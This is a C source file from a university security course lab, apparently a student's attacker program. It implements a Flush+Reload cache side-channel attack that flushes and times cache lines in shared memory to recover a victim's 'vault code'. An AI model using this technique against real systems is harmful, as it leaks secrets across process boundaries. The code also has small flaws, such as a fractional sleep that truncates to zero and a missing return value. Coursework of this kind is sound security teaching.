/**
 * 
 * CMU 15-799 Security for Software and Hardware Systems Spring 2023
 * 
 *  thief.c is the attacker implementation. You need to add the code for 
 *  flush_reload().
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <math.h>
#include <stdlib.h>

#define SHARED_ID "CHANNEL"
#define ENOUGH ((CHAR_BIT * sizeof(int) - 1) / 3 + 2)


// flush and reload should be straight forward
// you can traverse the buffer and use the utility functions
// to flush lines and perform the reload step.
int flush_reload(int size, uint8_t *buf) {
    /* Prepare the output file. */
    FILE *fp;
      
    // fclose(fopen("indices.txt", "w"));
    fp = fopen("indices.txt", "a");
    
    FILE *fp2;

    // fp2 = fopen("access_times.txt", "w");
    // fclose(fp2);
    fp2 = fopen("access_times.txt", "a");

    /* Int to be used to find smallest access times. */
    uint32_t smallest_access_Time = 1000000;

    /* Iterate over the buf. */
    int i = 0;
    for (; i < size; i++) {
        clflush(&buf[i]); // Flush the index
        sleep(0.000001);  // sleep and wait for vault to access index vault_code
        uint32_t access_time = measure_line_access_time(&buf[i]); // Measure the access time
        
        
        
        /* Find smallest access time. */
        if (access_time < smallest_access_Time) {
            int prev_access_time = smallest_access_Time; // Used to not print 0th index everytime
            smallest_access_Time = access_time;
            if (access_time < 500 && prev_access_time < 1000000) {
                /* Print to console the indeces that have access_time < 500*/
                printf("%d, %d\n", i, access_time);
                
                /* Create a string of i to add to the file. */
                int enough = ((8 * sizeof(int) - 1) / 3 + 2);
                char str[1000] = {0};
                snprintf(str,999, "%d\n", i);
                /* Write to output file the index that have access_time < 500*/
                fputs(str, fp);
                snprintf(str,999, "%d\n", access_time);
                fputs(str, fp2);
            }
        }

        
    }

    /* Close file. */
    fclose(fp);
    fclose(fp2);
}

int main(int argc, char const *argv[]) {
    int fd;
    fd = shm_open(SHARED_ID, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
    if (fd == -1){
	printf("shm_open error\n");
	exit(1);
    }

    int buf_size = 4096 * 512;
    uint8_t *buf;
    if ((buf = (uint8_t *)mmap(
           NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED) {
        printf("mmap error\n");
        exit(1);
    }
    

    // you may need to add repetitions  
    int i = 0;
    while(i < 300) {
        flush_reload(buf_size, buf);
        i++;
    }
    //print the key code and access time in the following  form
    // printf("Vault code: %d (%d)\n", key_code, latency);
 }
